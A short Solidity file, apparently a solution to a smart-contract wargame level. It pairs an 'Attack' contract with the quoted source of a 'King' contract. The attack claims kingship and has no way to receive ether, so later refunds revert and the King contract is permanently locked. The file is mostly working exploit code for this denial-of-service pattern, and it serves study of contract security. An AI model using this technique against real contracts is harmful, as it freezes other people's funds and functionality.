// SPDX-License-Identifier: UNLINCESED

pragma solidity ^0.6.0;

contract Attack {
    function attackCall(address target) external payable {
        (bool success, ) = payable(target).call{value: msg.value}("");
        require(success, "Attack success");
    }
}

// source code
contract King {

  address payable king;
  uint public prize;
  address payable public owner;

  constructor() public payable {
    owner = msg.sender;  
    king = msg.sender;
    prize = msg.value;
  }

  receive() external payable {
    require(msg.value >= prize || msg.sender == owner);
    king.transfer(msg.value);
    king = msg.sender;
    prize = msg.value;
  }

  function _king() public view returns (address payable) {
    return king;
  }
}